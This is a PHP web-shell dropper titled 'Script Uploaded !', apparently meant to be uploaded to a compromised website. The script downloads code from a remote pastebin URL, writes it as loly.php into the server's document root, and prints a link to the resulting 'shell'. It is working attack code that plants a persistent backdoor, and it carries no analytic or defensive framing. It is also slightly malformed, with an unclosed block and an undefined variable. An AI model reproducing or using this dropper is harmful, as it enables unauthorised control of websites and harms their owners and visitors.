<!DOCTYPE HTML>
<html><head>
<title>Script Uploaded !</title>
<center>
</html>
<?php
function http_get($url){
$d7net = curl_init($url);
curl_setopt($d7net, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($d7net, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($d7net, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($d7net, CURLOPT_HEADER, 0);
return curl_exec($d7net);
curl_close($d7net);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/loly.php" ;
$text = http_get('https://pastebin.com/raw/duN01Efx');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
echo $check."</br>";

echo "<br><br>Shell Lu ~> <b><a href='$web/loly.php' target='_blank'>loly.php</b></a>";

?>
